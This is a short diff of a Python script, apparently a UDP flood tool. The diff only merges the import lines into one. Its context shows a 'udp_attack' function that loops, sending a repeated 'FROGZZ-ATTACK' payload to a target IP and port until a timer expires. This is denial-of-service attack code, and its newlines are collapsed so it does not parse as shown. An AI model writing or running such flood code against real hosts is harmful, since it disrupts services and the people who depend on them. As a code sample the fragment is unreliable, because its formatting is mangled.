@@ -1,4 +1,4 @@
-import threading import time import socket import requests
+import threading, time, socket, requests
 
 def udp_attack(ip, port, duration, thread_id): timeout = time.time() + duration sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) data = b'FROGZZ-ATTACK' * 50 while time.time() < timeout: try: sock.sendto(data, (ip, port)) print(f"[UDP-{thread_id}] Attack sent to {ip}:{port}") except: continue
 
